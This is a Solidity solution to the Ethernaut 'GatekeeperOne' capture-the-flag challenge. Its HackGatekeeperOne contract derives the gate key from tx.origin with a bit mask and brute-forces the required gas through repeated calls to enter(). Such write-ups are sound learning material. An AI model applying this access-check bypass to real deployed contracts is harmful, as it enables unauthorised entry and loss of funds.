// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/GatekeeperOne.sol';

/* Solution using Remix

    First gate
      -We need to call the GatekeeperOne from another smart contract
    Second gate
      -We need to use remix in order to calculate the amount of gas when we reach the opcode
      -The opcode we need to use is the corresponding to the gas comparison
    Third gate
      -An address has 20 bytes
      -The gateKey has 8 bytes
      -One byte equals 8 uints
      -We need to use the last 2 bytes of the address (uint16)
      -Next 2 bytes need to be 0 (uint32)
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      
      -Next 4 bytes needs to not be 0
         require(uint32(uint64(_gateKey)) != uint64(_gateKey)
      
 */

contract HackGatekeeperOne {
    GatekeeperOne public originalContract;
    // If we use this mask with out address, it will have the first 4 bytes and the last 2 bytes
    // The 2 bytes left in the middle are gonna be 0
    uint64 mask64 = 0xffffffff0000ffff;
    bytes8 key;

    constructor(address contractAddress) {
        // Set the original contract address in the constructor
        originalContract = GatekeeperOne(contractAddress);
    }

    function hack() public {
        // Calculate the key and save it
        key = bytes8(uint64(uint160(tx.origin) & mask64));
        // It's very difficult to calculate the exact amount of gas
        // For me, the exact amount of gas consumpted until it reaches the execution of gasLeft was 271
        // But when I use it with the ethernaut contract, it fails
        // We also need to multiply 8191 for three, otherwise there will not be enought gas
        // So, what I did was to use and approximate and a for loop
        // We seize that the call function doesn't revert, so we execute it over and over again
        // Until it succeeded
        for (uint256 i = 0; i < 150; i++) {
            (bool success,) =
                address(originalContract).call{gas: i + 200 + (8191 * 3)}(abi.encodeWithSignature('enter(bytes8)', key));
            if (success) {
                break;
            }
        }
    }
}
